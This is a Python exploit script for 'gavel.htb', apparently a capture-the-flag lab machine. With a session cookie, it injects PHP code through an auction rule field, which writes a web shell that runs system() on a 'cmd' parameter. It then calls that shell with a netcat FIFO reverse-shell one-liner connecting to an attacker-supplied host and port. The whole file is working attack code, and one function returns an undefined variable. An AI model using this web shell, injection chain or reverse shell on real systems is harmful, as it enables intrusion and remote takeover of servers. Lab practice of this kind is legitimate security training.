import requests
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--session-cookie', help='Gavel session cookie', required=True)
parser.add_argument('-i', '--auction_id', help='Auction ID to attack', required=True)
parser.add_argument('-lh', '--lhost', help='LHOST - IP listening for reverse shell connection', required=True)
parser.add_argument('-lp', '--lport', help='LPORT - port listening for reverse shell connection', required=True)
parser.add_argument('-w', '--webshell-name', help='Web shell file name', default='websh.php') 
parser.add_argument('-f', '--fifo-fname', help='FIFO file name', default='p')
args = parser.parse_args()

session = requests.session()
session.cookies.set("gavel_session", args.session_cookie)

websh_name = args.webshell_name
payload = 'fwrite(fopen("' + websh_name + '", "w"), \'<html><body><form method="GET" name="<?php echo basename($_SERVER[\\\'PHP_SELF\\\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET[\\\'cmd\\\'])){ system($_GET[\\\'cmd\\\'] . \\\' 2>&1\\\');}?></pre></body></html>\');'
fn = args.fifo_fname
revshell = f'rm /tmp/{fn};mkfifo /tmp/{fn};cat /tmp/{fn}|sh -i 2>%261|nc {args.lhost} {args.lport} >/tmp/{fn}'

def activate_exploit(auction_id):
    burp0_url = "http://gavel.htb:80/includes/bid_handler.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://gavel.htb/bidding.php", "Content-Type": "multipart/form-data; boundary=----geckoformboundary1fe131491656742f8535337b822ad024", "Origin": "http://gavel.htb", "Connection": "keep-alive", "Priority": "u=0"}
    burp0_data = f"------geckoformboundary1fe131491656742f8535337b822ad024\r\nContent-Disposition: form-data; name=\"auction_id\"\r\n\r\n{auction_id}\r\n------geckoformboundary1fe131491656742f8535337b822ad024\r\nContent-Disposition: form-data; name=\"bid_amount\"\r\n\r\n10000\r\n------geckoformboundary1fe131491656742f8535337b822ad024--\r\n"
    session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return res

def store_payload(payload, auction_id):
    burp0_url = "http://gavel.htb:80/admin.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://gavel.htb", "Connection": "keep-alive", "Referer": "http://gavel.htb/admin.php", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    burp0_data = {"auction_id": auction_id, "rule": payload, "message": "This auction rule has been exploited"}
    res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return res

def spawn_revshell(revshell):
    burp0_url = f"http://gavel.htb:80/includes/{websh_name}?cmd={revshell}"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://gavel.htb/includes/webme.php?cmd=cat+%2Fetc%2Fpasswd", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    try:
        res = session.get(burp0_url, headers=burp0_headers, timeout=5)
    except requests.exceptions.ReadTimeout:
        return True, None
    return False, res

if __name__ == '__main__':
    print(f'[+] Exploiting auction with ID {args.auction_id}')
    print(f'[+] Session cookie set: {session.cookies.get('gavel_session')}')
    print(f'[+] Reverse shell will connect to {args.lhost}:{args.lport}')
    print(f'[+] Web shell payload: {payload}')
    print(f'[+] Reverse shell payload: {revshell}')
    print('[+] Sending webshell payload...')
    res = store_payload(payload, args.auction_id)
    print(f'[*] Response: {res.status_code}')
    print('[+] Activating exploit...')
    res = activate_exploit(args.auction_id)
    print(f'[*] Response: {res.status_code}')
    print('[+] Taking a 7 seconds nap...')
    print('[+] Spawining the reverse shell...')
    time.sleep(7)
    status, res = spawn_revshell(revshell)
    if status:
        print('[!] Connection pending. Exploit successful!')
    else:
        print(f'[-] Exploit failed. Status code received: {res.status_code}')
